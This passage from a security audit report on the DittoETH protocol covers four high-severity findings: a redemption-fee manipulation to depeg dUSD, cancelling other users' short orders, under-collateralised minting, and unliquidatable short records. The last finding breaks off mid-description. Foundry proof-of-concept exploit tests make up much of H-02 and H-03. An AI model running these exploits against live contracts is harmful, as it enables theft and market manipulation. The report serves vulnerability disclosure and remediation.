[H-01] A successfully disputed redemption proposal has still increased the redemption fee base rate; exploit to depeg dUSD
Submitted byd3e4
Redemptions may not be incentivized to increase the value of dUSD. Furthermore, this may be deliberately induced to prevent a falling dUSD from repegging, ultimately causing dUSD to fully depeg and crash. The motivations for this attack could be anything from pure spite (perhaps from a competitor)
Root cause and summary
The most fundamental root cause of this issue and exploit is that the base rate in the redemption fee is increased when a redemption is proposed, but not restored (decreased) if the redemption is successfully disputed.
When dUSD is trading below the dollar, redemptions are needed to restore the peg. The redemption fee regulates the incentive to redeem dUSD. So if the redemption fee is increased, without contributing to the peg restoration by decreasing the supply of dUSD, the peg restoration mechanism is impeded and sufficient redemptions will not happen. A sufficiently high redemption fee will make any redemption a loss for the redeemer, which means that the peg will not be restored.
This issue becomes viable as a direct exploit because of multiple factors reducing its cost to the attacker:
The attacker can avoid paying the penalty by disputing his own proposal (using a different account).The redemption fee contains an added base fee of 0.5% which reduces the required amount to propose, on which the fee is paid.A. The total redemption fee decreases, down to almost a half, if the proposed amount is split over several redemption proposals.B. By splitting the total proposed amount the attacker only needs to escrow dUSD for one such part (at a time), which minimizes his own loss on his devalued dUSD.The redemption fee is proportional to the collateral that would be redeemed, which is capped to the short record’s collateral balance; whereas the base rate is increased based on the amount proposed, which is not reduced accordingly. This can only be leveraged if there exists an undercollateralized short record. But if there is, this can be leveraged to make this exploit essentially for free for about 48 hours.
With the possible exception of 1 above, all of the above are issues in their own right, especially 4; which is therefore, also reported separately. The impact of 2 and 3 is subject to the model used for how (quantitatively) redemptions restore the peg,; therefore, is discussed below rather than reported separately.
Proof of Concept
The goal of this exploit is to cause a persistent and complete loss of incentive to redeem dUSD, such that a dUSD trading below the dollar fails to recover its peg.
There is some level below which dUSD is critically depegged. This is at least at the level where it becomes undercollateralized. For example, if the total collateral ratio is 1.25, this would happen if dUSD trades at$0.80. However, there is also a psychological and interfacing aspect. Since dUSD is supposed to maintain a 1:1 peg, if dUSD persistently trades at$0.90or even$0.95, users might become suspicious, lose interest, or deem dUSD unsuitable or broken; which would cause it to further depeg. Therefore, any significant depeg will become critical if it is also persistent over time.
It is assumed that there are always market forces (randomly) pushing the value of dUSD down, which is why the peg restoration mechanism through redemptions is necessary. If redemptions are prevented it is therefore assumed that these forces will take over and keep pushing dUSD downwards.
A complete collapse of dUSD is not necessarily the goal. This could also be profited from as a kind of market manipulation where the attacker crashes the price to buy cheap dUSD, and then lets the redemption incentive back in and redeem his cheaply gotten dUSD (for real this time).
The exploit will thus be considered successful if redemptions are prevented throughout the time it takes dUSD to drop from$1.00to (e.g.)$0.95and then keep preventing redemptions for some time.
The redemption fee isredemptionRate * redemptionAmount(redemptionAmountin USD value or dUSD equivalently). The profit on a redemption is(1 - price) * redemptionAmount - redemptionRate * redemptionAmount. Thus, wheneverredemptionRate >= (1 - price)there is no profit to be made on redemptions. This is the redemption rate we want to maintain.
When a redemption is proposedthe redemption fee is calculated.This updates thebaseRate. When a redemption proposal isdisputednothing is done to thebaseRate. This is the root cause of this issue.
When a redemption proposal is disputedthe redemption proposer gets back the entire amount proposed minus the penalty. This means that if the disputer and the proposer is the same person (using different addresses, since they cannot be the same) then the penalty is not lost. The attack would be performed as a proposal atomically followed by a dispute. This shows issue 1 in the list above.
The redemption proposer still has topay the redemption fee, however. We will now investigate how much this would cost the attacker.
Ignoring the decay for now, when an amountais proposedthe base rate increases bya / (2 * totalSupply), wheretotalSupplyis the total supply of dUSD, i.e. the totalercDebt. Sincea base rate of 0.5% is always added(issue 2 above), we only need to keep the base rate at1 - price - 0.005.
Assuming an initial base rate of0, to bring the base rate up to1 - price - 0.005we would then proposea = (1 - price - 0.005) * 2 * totalSupply. The redemption fee would then be(1 - price) * (1 - price - 0.005) * 2 * totalSupply. Forprice = 0.95this is0.0045 * totalSupply.
If we split the amountaintonsmaller parts each of sizea/nthen the base rate will increase(a/n) / (2 * totalSupply)each time (so we still need to propose the same total amount), but the redemption fee on thekth time will only bea/n * (k * (a/n) / (2 * totalSupply) + 0.005). Note that if each proposals is immediately disputed thentotalSupplyremains constant; otherwise,totalSupplydecreases slightly each time such that the redeemed fraction increases such that we can propose less overall for even lower fees.
Summed over allkthis isa^2 * n * (n+1) / (n^2 * 4 * totalSupply) + 0.005 * a. The limit for highnisa * (a / (4 * totalSupply) + 0.005 * a). Substitutingafrom above we get that the total fees are((1 - price)^2 - 2.5e-5) * totalSupply, which is almost half of the single proposal cost. Forprice = 0.95this is0.002475 * totalSupply.
Let’s now consider the cost of working against the decay of the base rate. Afterthours the base rate has decayed by a factor2^(-t/12). In order to bring the redemption rate back up to1 - pricewe need to propose another(1 - price - (1 - price) * 2^(-t/12)) * 2 * totalSupply, on which we pay in fees(1 - price)^2 * (1 - 2^(-t/12)) * 2 * totalSupply. In the best case we only need to do this very rarely, and the average cost per hours then tends to zero. In the worst case, if we have to propose continuously, the limit is(1 - price)^2 * 2 * totalSupply * ln(2)/12per hour. Forprice = 0.95this is0.00029 * totalSupplyin the worst case.
Finally let’s discuss issue 4. If the short record holds less collateral than can cover the proposed amount, thenit is capped to whatever it does hold. The proposed amount, however,is not reduced. These arepassed to the calculation of the redemption fee, and it isthe collateral redeemed that is multiplied by the redemption rate, whilethe base rate is increased based on the amount proposed (ercDebtRedeemed). This means that we pay a smaller fee than we should.
Once there is an undercollateralized short record we can first partially redeem it so that almost no (or zero?) collateral remains. This decreases the collateral to almost0, while some debt still remains.
Performing our attack with two such short records, we can make and dispute proposals where the fees are almost zero but still increase the base rate each time. We can now blow up the redemption rate to the maximum 100% essentially for free. This will decay down to 6.25% in 48 hours, which is sufficient to prevent redemptions down to a price of0.9325. These severely undercollateralized short records may of course be immediately proposed and claimed by anyone, but it is not necessarily likely that anyone will do that, since there is no profit to be made. We might therefore be able to repeat this every 48 hours (or more often) and maintain an arbitrarily high redemption rate almost for free.
Bonus note on issues 2 and 3
The redemption fee mechanism is clearly intended to be optimal for redemption amounts which reduce the supply in accordance with theQuantity Theory of Money. However, the added 0.5% fee disrupts this and makes redemption optimal for a amount insufficient to restore the peg. The intention behind the 0.5% is probably to not allow free redemptions and to bring in some profit to the protocol, but it does not make sense to always add it. It should then be only a lower limit.
Furthermore, this optimality is only valid under the assumption that redemptions are proposed in wholes, and not split up. As seen above, more can profitably be redeemed if the redemption is split in many small parts. This causes redemptions to overshoot, causing the price to increase above$1.00(as per QTM). This is not as straightforward to fix, but one solution might be to only allow sufficiently large proposed amounts.
It should also of course be possible to redesign the peg stabilization mechanism, by some direct reference to the deviation from the peg, since this deviation is explicitly know through the oracle price.
Recommended Mitigation Steps
Make sure the base rate is unaffected by a proposal which is successfully disputed. It might be tricky to account for the decay if attempting to later subtract when disputing. A possible solution might be to simply calculate and apply the new rate only when a proposal is successfully claimed.
ditto-eth (DittoETH) confirmed

[H-02] An attacker can cancel other people’s short orders
Submitted by00xSEV
LibSRUtil.transferShortRecorddoes not check the owner ofnft.shortOrderIdbefore canceling it.shortOrderIds are reused after the order is canceled.
An attacker can create a state for an NFT where the short record’s status isSR.PartialFill, butnft.shortOrderIdis already reassigned to another user, yet still set in the attacker’s NFT. This will make the system think that it needs to cancelnft.shortOrderId, even though it belongs to another user already and does not reference the original order.
Vulnerability Details
https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/libraries/LibSRUtil.sol#L134-L136
if(short.status==SR.PartialFill) {LibOrders.cancelShort(asset,nft.shortOrderId);}
For the example, we will use ids that would be used by a new asset (starting ids, 2 forshortRecordand 100 for short order).
Steps for the attacker, the simplest attack (seetest1function in PoC too):
Create a short record that will be partially filled:The attacker can create a limit short + market bid in the same transaction. The market bid must not fully cover the limit short.Then, possibly in the same transaction, they:mintNFTshortRecordId= 2shortOrderId= 100short order’s linked list state:HEAD <-> HEAD <-> 100 <-> TAIL.Cancel the short.Short order’s linked list stateHEAD <-> 100 <-> HEAD <-> TAIL.Cancel the short record with id 2 (exitShortErcEscrowedin PoC).A victim creates a limit short:shortOrderIdis 100 again (reused), but it is a different order, it belongs to the victim now.Short order’s linked list stateHEAD <-> HEAD <-> 100 <-> TAIL.The attacker decides to cancel it.The attacker creates a new short record (the same way as in step 1). Note that because the last short record withid=2was canceled its id will be reused.Even though we canceled the short record in step 2.3, it is now recreated. So, the new record’s id is 2 again and the.statusisSR.PartialFill.Attacker doestransferFrom:All the checks are passed because the short record with id is legit, the status isSR.PartialFill, and the record belongs to the attacker.The code will callLibOrders.cancelShort(asset, nft.shortOrderId);.nft.shortOrderIdis 100.The short order with id 100 is canceled (victim’s order).
The attacker can also create many NFTs and choose which orders to cancel as they wish (See the second function in PoC). The attacker can then create the NFTs again and start the attack again (See the third PoC).
It’s also possible to have several NFTs on the same address or different addresses with the samenft.shortOrderId. It may also lead to accidental cancellation even if a user is not malicious.
Impact
The attacker has full control over which short orders appear on the order book; they can censor orders, manipulate the price by canceling orders with a low price.
It’s possible to reduce other’s rewards by canceling shorts just before the rewards are due (Token yield is provided only after some time on the order book, seehere).
The platform is unusable because short orders can be canceled at any time arbitrarily by an attacker, or several attackers/bad actors, who do not like some short orders.
Proof of Concept
forge test -vvv --match-path contracts/AANftAttack.sol
// SPDX-License-Identifier: GPL-3.0-onlypragmasolidity0.8.21;import"contracts/libraries/LibOrders.sol";import{Test}from"forge-std/Test.sol";import{OBFixture}from"test/utils/OBFixture.sol";import{console}from"contracts/libraries/console.sol";import{IDiamond}from"interfaces/IDiamond.sol";import"contracts/libraries/AppStorage.sol";import"contracts/libraries/Constants.sol";import"contracts/interfaces/IDiamondCut.sol";import"contracts/libraries/LibAsset.sol";import{U256,U88,U80}from"contracts/libraries/PRBMathHelper.sol";import{TestTypes}from"test/utils/TestTypes.sol";import{console2}from"forge-std/console2.sol";contractAppStorageReader{functionminAskEth(addressasset)externalviewreturns(uint) {returnLibAsset.minAskEth(asset);}functioninitialCR(addressasset)externalviewreturns(uint) {returnLibAsset.initialCR(asset);}functionminShortErc(addressasset)externalviewreturns(uint) {returnLibAsset.minShortErc(asset);}functiongetBid(addressasset,uint16id)externalviewreturns(STypes.Ordermemory) {returnappStorage().bids[asset][id];}functiongetShort(addressasset,uint16id)externalviewreturns(STypes.Ordermemory) {returnappStorage().shorts[asset][id];}functiongetTokenIdCounter()externalviewreturns(uint40) {returnappStorage().tokenIdCounter;}}contractAANftAttackisOBFixture{usingU256foruint256;usingU88foruint88;usingU80foruint80;bytes4[]internalappStorageReaderSelectors= [AppStorageReader.minAskEth.selector,AppStorageReader.initialCR.selector,AppStorageReader.getBid.selector,AppStorageReader.getShort.selector,AppStorageReader.getTokenIdCounter.selector,AppStorageReader.minShortErc.selector];IDiamondCut.FacetCut[]publicnewCut;// Shows that an attacker can cancel someone else's order, simplified, only one orderfunctiontest1()external{_addAppStorageReaderToDiamond();addressattacker=address(0x5a9a88bD94c8410243B0c04018811b8cA4D09D55);addressvictim=address(0x0537B70dc9F255c76AE6E583D3D282fEE96E1E84);fundLimitShort(DEFAULT_PRICE,DEFAULT_AMOUNT,attacker);fundMarketBid(DEFAULT_PRICE,DEFAULT_AMOUNT/10,attacker);vm.startPrank(attacker);diamond.mintNFT(asset,C.SHORT_STARTING_ID,C.STARTING_ID);cancelShort(C.STARTING_ID);vm.stopPrank();STypes.ShortRecordmemoryshortRecord=getShortRecord(attacker,C.SHORT_STARTING_ID);uint88amount=shortRecord.ercDebt;// Deletes the last shortRecordexitShortErcEscrowed(C.SHORT_STARTING_ID,amount,attacker);fundLimitShort(DEFAULT_PRICE-1,DEFAULT_AMOUNT*99,victim);// Creates new shortRecordfundLimitShort(DEFAULT_PRICE,DEFAULT_AMOUNT,attacker);fundMarketBid(DEFAULT_PRICE,DEFAULT_AMOUNT/10,attacker);// _logShortOrders();vm.prank(attacker);// You can comment this line to make sure cancelShort will not revertdiamond.transferFrom(attacker,attacker,1);// _logShortRecords(attacker);// _logShortOrders();vm.prank(victim);vm.expectRevert(Errors.NotActiveOrder.selector);cancelShort(C.STARTING_ID);}// Shows that an attacker can cancel arbitrary orders, more complexfunctiontest2()external{_addAppStorageReaderToDiamond();// Random addresses, can be indefiniteaddress[3]memoryattackerAddresses= [0x5a9a88bD94c8410243B0c04018811b8cA4D09D55,0x12e9757fB4a2990aDaf10A6ca8C7085C06cF7173,0x9A2f3C59E8CF1f7c0e514D7f22B37BA2E58CF737];addressvictim=address(0x0537B70dc9F255c76AE6E583D3D282fEE96E1E84);for(uint8i;i<attackerAddresses.length;i++){// These two lines create a ShortRecord// Price decreases with each step to make a new order the first to be filled,// ensuring that every fill (market bid) does not go to the first short order.// Price is higher than default to be > oracle price and be filledfundLimitShort(DEFAULT_PRICE+100-i,DEFAULT_AMOUNT,attackerAddresses[i] );fundMarketBid(DEFAULT_PRICE+100,DEFAULT_AMOUNT/10,attackerAddresses[i] );vm.prank(attackerAddresses[i]);diamond.mintNFT(asset,C.SHORT_STARTING_ID,C.STARTING_ID+i);}for(uint8i;i<attackerAddresses.length;i++){vm.prank(attackerAddresses[i]);cancelShort(C.STARTING_ID+i);STypes.ShortRecordmemoryshortRecord=getShortRecord(attackerAddresses[i],C.SHORT_STARTING_ID);uint88amount=shortRecord.ercDebt;exitShortErcEscrowed(C.SHORT_STARTING_ID,amount,attackerAddresses[i]);}// Emptyconsole.log("__Before victim creates orders (empty):");_logShortOrders();// +111, +222, +333 are used to differentiate between orders in the log output.fundLimitShort(DEFAULT_PRICE+1000,DEFAULT_AMOUNT+111,victim);fundLimitShort(DEFAULT_PRICE+1000,DEFAULT_AMOUNT+222,victim);fundLimitShort(DEFAULT_PRICE+1000,DEFAULT_AMOUNT+333,victim);// 3 victim's ordersconsole.log("__After victim creates orders (3 orders):");_logShortOrders();for(uint8i;i<attackerAddresses.length;i++){// Skip the second one just to demonstrate that one can cancel arbitraryif(i==1)continue;// Create shorts that will be partially filled, to create shortRecords// We need it to replace deleted/closed records with id C.SHORT_STARTING_ID// with a new one. It will set their status to PartiallyFilledfundLimitShort(DEFAULT_PRICE+100-i,DEFAULT_AMOUNT+4444+i,attackerAddresses[i] );fundMarketBid(DEFAULT_PRICE+100,DEFAULT_AMOUNT/10,attackerAddresses[i] );vm.prank(attackerAddresses[i]);diamond.transferFrom(attackerAddresses[i],attackerAddresses[i],1+i);}console.log("__After the attack (2 attackers orders followed by a victim's one):");_logShortOrders();}// Shows that an attacker can repeat the attack indefinitelyfunctiontest3()external{_addAppStorageReaderToDiamond();// Random addresses, can be indefiniteaddress[3]memoryattackerAddresses= [0x5a9a88bD94c8410243B0c04018811b8cA4D09D55,0x12e9757fB4a2990aDaf10A6ca8C7085C06cF7173,0x9A2f3C59E8CF1f7c0e514D7f22B37BA2E58CF737];addressattackerAdditionalAddress=0xefa7092E09664743518177Fc740f257d3C17D348;addressvictim=address(0x0537B70dc9F255c76AE6E583D3D282fEE96E1E84);for(uint8i;i<attackerAddresses.length;i++){// These two lines create a ShortRecord// Price decreases with each step to make a new order the first to be filled,// ensuring that every fill (market bid) does not go to the first short order.// Price is higher than default to be > oracle price and be filledfundLimitShort(DEFAULT_PRICE+100-i,DEFAULT_AMOUNT,attackerAddresses[i] );fundMarketBid(DEFAULT_PRICE+100,DEFAULT_AMOUNT/10,attackerAddresses[i] );vm.prank(attackerAddresses[i]);diamond.mintNFT(asset,C.SHORT_STARTING_ID,C.STARTING_ID+i);}for(uint8i;i<attackerAddresses.length;i++){vm.prank(attackerAddresses[i]);cancelShort(C.STARTING_ID+i);STypes.ShortRecordmemoryshortRecord=getShortRecord(attackerAddresses[i],C.SHORT_STARTING_ID);uint88amount=shortRecord.ercDebt;exitShortErcEscrowed(C.SHORT_STARTING_ID,amount,attackerAddresses[i]);}// Emptyconsole.log("__Before victim creates orders (empty):");_logShortOrders();fundLimitShort(DEFAULT_PRICE+1000,DEFAULT_AMOUNT+111,victim);fundLimitShort(DEFAULT_PRICE+1000,DEFAULT_AMOUNT+222,victim);fundLimitShort(DEFAULT_PRICE+1000,DEFAULT_AMOUNT+333,victim);// 3 victim's ordersconsole.log("__After victim creates orders (3 orders):");_logShortOrders();for(uint8i;i<attackerAddresses.length;i++){// Create shorts that will be partially filled, to create shortRecords// We need it to replace deleted/closed records with id C.SHORT_STARTING_ID// with a new one. It will set their status to PartiallyFilledfundLimitShort(DEFAULT_PRICE+100-i,DEFAULT_AMOUNT+4444+i,attackerAddresses[i] );fundMarketBid(DEFAULT_PRICE+100,DEFAULT_AMOUNT/10,attackerAddresses[i] );vm.prank(attackerAddresses[i]);diamond.transferFrom(attackerAddresses[i],attackerAddresses[i],1+i);}console.log("__After the attack (3 attackers orders):");_logShortOrders();// 102----HEAD--101--100--103  <--short order ids from the linked list of orders//Canceled--H----2----1----0   <--attacker ids from attackerAddresses// We want 102--101--100--HEAD--103, so we cancel 2->1->0// (A canceled order is placed immediately to the left of HEAD)vm.prank(attackerAddresses[2]);cancelShort(101);vm.prank(attackerAddresses[1]);cancelShort(100);vm.prank(attackerAddresses[0]);cancelShort(103);// We got 102--101--100--103--HEAD// Then create an order to remove 103 and get to a desired statefundLimitShort(DEFAULT_PRICE+1e6,DEFAULT_AMOUNT+999,attackerAdditionalAddress);console.log("__Ready for another attack (102--101--100--HEAD--103):");_logShortOrders();// We got 102--101--100--HEAD--103for(uint8i;i<attackerAddresses.length;i++){fundLimitShort(DEFAULT_PRICE+100-i,DEFAULT_AMOUNT,attackerAddresses[i] );fundMarketBid(DEFAULT_PRICE+100,DEFAULT_AMOUNT/10,attackerAddresses[i] );vm.prank(attackerAddresses[i]);diamond.mintNFT(asset,C.SHORT_STARTING_ID,C.STARTING_ID+i);}for(uint8i;i<attackerAddresses.length;i++){vm.prank(attackerAddresses[i]);cancelShort(C.STARTING_ID+i);STypes.ShortRecordmemoryshortRecord=getShortRecord(attackerAddresses[i],C.SHORT_STARTING_ID);uint88amount=shortRecord.ercDebt;exitShortErcEscrowed(C.SHORT_STARTING_ID,amount,attackerAddresses[i]);}console.log("__Ready for another attack full:");_logShortOrders();// Victims create orders againfundLimitShort(DEFAULT_PRICE+1000,DEFAULT_AMOUNT+555,victim);fundLimitShort(DEFAULT_PRICE+1000,DEFAULT_AMOUNT+666,victim);fundLimitShort(DEFAULT_PRICE+1000,DEFAULT_AMOUNT+777,victim);console.log("____Second iteration____");console.log("__After victim creates orders (3 victim's orders + an attacker's one):");_logShortOrders();for(uint8i;i<attackerAddresses.length;i++){fundLimitShort(DEFAULT_PRICE+100-i,DEFAULT_AMOUNT+4444+i,attackerAddresses[i] );fundMarketBid(DEFAULT_PRICE+100,DEFAULT_AMOUNT/10,attackerAddresses[i] );vm.prank(attackerAddresses[i]);// id (the last argument) starts with 4 because 3 NFTs have been minted// in the previous attack; we don't use them anymorediamond.transferFrom(attackerAddresses[i],attackerAddresses[i],4+i);}console.log("__Second attack done (4 attacker's orders):");_logShortOrders();}function_logShortRecords(addressaddr)internalview{console.log("===");console.log("id: ",0);console.log(getShortRecord(addr,0));console.log("id: ",1);console.log(getShortRecord(addr,1));console.log("id: ",2);console.log(getShortRecord(addr,2));console.log("id: ",3);console.log(getShortRecord(addr,3));console.log("id: ",4);console.log(getShortRecord(addr,4));console.log("===");}function_addAppStorageReaderToDiamond()internal{newCut.push(IDiamondCut.FacetCut({facetAddress:address(newAppStorageReader()),action:IDiamondCut.FacetCutAction.Add,functionSelectors:appStorageReaderSelectors}));vm.prank(owner);diamond.diamondCut(newCut,address(0),"");}function_logBids()internalview{// See console.logBidsSTypes.Ordermemoryo=AppStorageReader(_diamond).getBid(asset,C.HEAD);console.log(o);uint16currentId=o.nextId;while(currentId!=C.TAIL) {o=AppStorageReader(_diamond).getBid(asset,currentId);console.log(o);currentId=o.nextId;}console.log("--");}function_logShortOrders()internalview{// See console.logShortsSTypes.Ordermemoryo=AppStorageReader(_diamond).getShort(asset,C.HEAD);console.log(o);uint16currentId=o.nextId;while(currentId!=C.TAIL) {o=AppStorageReader(_diamond).getShort(asset,currentId);console.log(o);currentId=o.nextId;}console.log("--");}}
Recommended Mitigation Steps
Consider checking the owner of the short order intransferShortRecordbefore cancelling it.Consider burning the nft when short record is deleted.
Assessed type
Invalid Validation
ditto-eth (DittoETH) confirmed

[H-03] Users can mint DUSD with less collateral than required, which gives them free DUSD and may open a liquidatable position
Submitted bynonseodion, also found byserial-coder
Users can mint more DUSD than the value of collateral they provided for the Short Order when they cancel it.
Note: Each number below is a step and some steps jump to other steps.
When a user cancels a short order, the following happens:
If the short’s associated short record has a status ofSR.Closed, i.e. it hasn’t been matched, it is deleted and the process moves to step 5.
LibOrders.sol#L898-L902
if(shortRecord.status==SR.Closed) {// @dev creating shortOrder automatically creates a closed shortRecord which also sets a shortRecordId// @dev cancelling an unmatched order needs to also handle/recycle the shortRecordId❌LibShortRecord.deleteShortRecord(asset,shorter,shortRecordId);}else{
Else, if the short record is partially filled or filled, it is checked if it has less than the minimum erc debt (minShortErc).
LibOrders.sol#L904
if(shortRecord.ercDebt<minShortErc) {
If it has less debt thanminShortErc, the short record is filled up to theminShortErcand its status is changed toSR.FullyFilledand the process moves to step 5.
LibOrders.sol#L905C1-L923
// @dev prevents leaving behind a partially filled SR is under minShortErc// @dev if the corresponding short is cancelled, then the partially filled SR's debt will == minShortErcuint88debtDiff=minShortErc-shortRecord.ercDebt;{STypes.VaultstorageVault=s.vault[vault];uint88collateralDiff=shortOrder.price.mulU88(debtDiff).mulU88(LibOrders.convertCR(shortOrder.shortOrderCR));❌LibShortRecord.fillShortRecord(asset,shorter,shortRecordId,❌SR.FullyFilled,collateralDiff,debtDiff,Asset.ercDebtRate,Vault.dethYieldRate);
Else, if it has more debt thanminShortErc, the status of the short record is changed toSR.FullyFilled.
LibOrders.sol#L934
shortRecord.status=SR.FullyFilled;
Finally the short order itself is canceled.
LibOrders.sol#L951
cancelOrder(s.shorts,asset,id);
The issue arises in step 3 where it tries to fill the short record up to theminShortErc. To fill the Short Record, it first gets the amount of DUSD needed in line 928 of the code snippet below asdebtDiff. The collateral needed to mint theDUSDis calculated in line 932.
There are two issues with the calculation in line 932:
It uses theshortOrderCRto calculate the collateral needed. If the short order’s collateral ratio is less than 1 ether then the value of the collateral calculated is less than the value of DUSD that eventually gets minted.It uses the short order’s priceshortOrder.priceto calculate the needed collateral. If this price is less than the current price of DUSD in ETH value, the collateral calculated is less than what is required. But if this price is higher than the current price, the user uses more ETH to mint the DUSD.
The short record is filled in line 934, and the collateral needed is removed from the ETH the user initially supplied when he created the short order in line 950. Note that the user (i.e. the shorter) gets thedebtDiff(i.e. DUSD minted) in line 953.
LibOrders.sol#L907-L938
928:uint88debtDiff=minShortErc-shortRecord.ercDebt;929:                 {930:STypes.VaultstorageVault=s.vault[vault];931:932:uint88collateralDiff=shortOrder.price.mulU88(debtDiff).mulU88(LibOrders.convertCR(shortOrder.shortOrderCR));933:934:LibShortRecord.fillShortRecord(935:asset,936:shorter,937:shortRecordId,938:SR.FullyFilled,939:collateralDiff,940:debtDiff,941:Asset.ercDebtRate,942:Vault.dethYieldRate943:                     );944:945:Vault.dethCollateral+=collateralDiff;946:Asset.dethCollateral+=collateralDiff;947:Asset.ercDebt+=debtDiff;948:949:// @dev update the eth refund amount950:eth-=collateralDiff;951:                 }952:// @dev virtually mint the increased debt953:s.assetUser[asset][shorter].ercEscrowed+=debtDiff;
A malicious user can exploit this by following these steps:
Create a short order on an asset that lets the user provide less than 100% capital.Ensure that the order only gets partially filled before it is added to the market.Cancel the order to mint DUSD for only a part of the collateral and get the minted DUSD.
This will allow him to mint more DUSD than the value of the collateral he provided. The Short Record he leaves is also immediately liquidatable.
Impact
The issues above has the following impacts:
Users can mint more DUSD than the collateral they provide.Users can mint DUSD at a lesser price than the current ETH price.A user can open a position that is immediately liquidatable if he does any of the two actions above.Users can also mint DUSD at a higher price than the current ETH price letting them experience a loss.
Proof of Concept
The POC below can be run in theshorts.t.solfile. It consists of 2 tests:
test_MintFreeDUSDshows how a user can mint DUSD for less collateral than required and open a liquidatable position.test_MintBelowPriceshows how a user can mint DUSD at a lesser price and open a liquidatable position.
// Make sure to import the types below into the Shorts.t.sol file// import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";functiontest_MintFreeDUSD()public{// set the initial, penalty and liquidation CRsvm.startPrank(owner);// set below 200 to allow shorter provide less than 100% of debtdiamond.setInitialCR(asset,170);diamond.setPenaltyCR(asset,120);diamond.setLiquidationCR(asset,150);vm.stopPrank();// create a bid to match the short and change its state to SR.PartialFillfundLimitBidOpt(1ether,0.01ether,receiver);// create the short providing only 70% of the dusd to be minteduint88price=1ether;depositEth(sender,price.mulU88(5000ether).mulU88(0.7ether));uint16[]memoryshortHintArray=setShortHintArray();MTypes.OrderHint[]memoryorderHintArray=diamond.getHintArray(asset,price,O.LimitShort,1);vm.prank(sender);diamond.createLimitShort(asset,uint80(price),5000ether,orderHintArray,shortHintArray,70);STypes.ShortRecordmemoryshort=getShortRecord(sender,C.SHORT_STARTING_ID);// successfully matches the bidassertTrue(short.status==SR.PartialFill);// cancel the short to use up collateral provided and mint dusdvm.prank(sender);cancelShort(101);short=getShortRecord(sender,C.SHORT_STARTING_ID);assertEq(short.ercDebt,2000ether);// 2000 dusd mintedassertEq(short.collateral,0.01ether+0.7*2000ether);// 70% of ETH collateral provided// this SR is liquidatableassertGt(diamond.getAssetNormalizedStruct(asset).liquidationCR,short.collateral.div(short.ercDebt.mul(1ether)));}functiontest_MintBelowPrice()public{// create a bid to match the short and change its state to SR.PartialFillfundLimitBidOpt(1ether,0.01ether,receiver);// create the short providing 400% of the dusd to be minted// current initialCR is 500%uint88price=1ether;depositEth(sender,price.mulU88(5000ether).mulU88(4ether));uint16[]memoryshortHintArray=setShortHintArray();MTypes.OrderHint[]memoryorderHintArray=diamond.getHintArray(asset,price,O.LimitShort,1);vm.prank(sender);diamond.createLimitShort(asset,uint80(price),5000ether,orderHintArray,shortHintArray,400);STypes.ShortRecordmemoryshort=getShortRecord(sender,C.SHORT_STARTING_ID);assertTrue(short.status==SR.PartialFill);// CR is partially filled by bid// set the new price to 1.5 ether so that price increaseuint256newPrice=1.5ether;skip(15minutes);ethAggregator.setRoundData(92233720368547778907wei,int(newPrice.inv()) /ORACLE_DECIMALS,block.timestamp,block.timestamp,92233720368547778907wei);fundLimitBidOpt(1ether,0.01ether,receiver);assertApproxEqAbs(diamond.getProtocolAssetPrice(asset),newPrice,15000000150);// cancel the short to mint at 1 ether instead of 1.5 ethervm.prank(sender);cancelShort(101);short=getShortRecord(sender,C.SHORT_STARTING_ID);assertEq(short.ercDebt,2000ether);// 2000 dusd minted// 2000 dusd minted for 8000 ether (400% at price of 1 ether)// instead of 12000 ether (400% at price of 1.5 ether)assertEq(short.collateral,0.01ether+4*2000ether);// position is liquidatableassertGt(diamond.getAssetNormalizedStruct(asset).liquidationCR,short.collateral.div(short.ercDebt.mul(1.5ether)));}
Recommended Mitigation Steps
Consider using theinitialCRof the asset if the short order’s CR is lesser and consider using the current oracle price instead of the short order’s price when it was created.
It is also possible that the ETH calculated exceeds the ETH the user provided when he created the Short Order. The sponsor can also consider sourcing more ETH from the user’s escrowed ETH to enable him to cancel when this occurs.
LibOrders.sol#L911-L938
-uint88collateralDiff=shortOrder.price.mulU88(debtDiff).mulU88(LibOrders.convertCR(shortOrder.shortOrderCR));+uint16cr=shortOrder.shortOrderCR<s.asset[asset].initialCR?s.asset[asset].initialCR:shortOrder.shortOrderCR;+uint80price=LibOracle.getSavedOrSpotOraclePrice(asset);+uint88collateralDiff=price.mulU88(debtDiff).mulU88(LibOrders.convertCR(cr));LibShortRecord.fillShortRecord(asset,shorter,shortRecordId,SR.FullyFilled,collateralDiff,debtDiff,Asset.ercDebtRate,Vault.dethYieldRate);Vault.dethCollateral+=collateralDiff;Asset.dethCollateral+=collateralDiff;Asset.ercDebt+=debtDiff;// @dev update the eth refund amount+if(eth<collateralDiff)revertErrors.InsufficientCollateral();eth-=collateralDiff;
ditto-eth (DittoETH) confirmed

[H-04] Partially filled Short Records created without a short order cannot be liquidated and exited
Submitted bynonseodion, also found by0xbepresent
When a Short Order is being created it tries to fill its Short Record. If it fills the Short Record, the Short Record is given a filled status (SR.FullyFilled) and the Short Order isn’t added to the market. But if it doesn’t fill the Short Record, it is given a partially filled status (SR.PartiallyFilled) and the remaining part of the Short Order is added to the market.
The issue is the current implementation doesn’t add the Short Order to the market every time the Short Record is partially filled. It does this in thesellMatchAlgo()function loop when it tries to match bids.
LibOrders.sol#L591-L597
❌matchIncomingSell(asset,incomingAsk,matchTotal);❌if(incomingAsk.ercAmount.mul(incomingAsk.price) >=minAskEth) {addSellOrder(incomingAsk,asset,orderHintArray);}s.bids[asset][C.HEAD].nextId=C.TAIL;return;
When the Short Order is being matched in thesellMatchAlgo()loop, it encounters the check in theifstatement above. If the value of the erc remaining in the short is less thanminAskEthit is not added to the market. The Short Record is already given theSR.PartiallyFilledstatus before the check.
When this happens, the Short Record is created with no associated Short Order. This prevents the user from exiting the Short Record and a liquidator from liquidating the position if it ever becomes liquidatable. These actions revert withInvalidShortOrder()error in the following portion of the code.
Exiting
When a user tries to exit using any of the exit functions, he has to pass a Short Order id.
ExitShortFacet.sol#L41
functionexitShortWallet(addressasset,uint8id,uint88buybackAmount,❌uint16shortOrderId)
ExitShortFacet.sol#L87
functionexitShortErcEscrowed(addressasset,uint8id,uint88buybackAmount,❌uint16shortOrderId)
ExitShortFacet.sol#L142
functionexitShort(addressasset,uint8id,uint88buybackAmount,uint80price,uint16[]memoryshortHintArray,❌uint16shortOrderId)
